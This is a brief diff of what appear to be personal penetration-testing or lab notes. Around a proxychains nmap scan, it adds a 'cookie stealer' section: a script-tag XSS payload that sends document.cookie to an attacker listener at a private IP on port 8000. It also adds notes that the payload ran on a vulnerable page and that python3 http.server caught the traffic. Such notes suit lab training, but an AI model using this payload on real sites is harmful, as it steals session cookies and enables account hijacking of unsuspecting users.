@@ -92,9 +92,12 @@ proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
 ```
 directories within website that can be further enumerated
 ```
-
+#  cookie stealer
 ```
 <script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
+above script ran on vulnerable web page
+python3 -m http.server
+above ran on lin ops iot intercept traffic
 ```
 
 #  Malicious file upload script
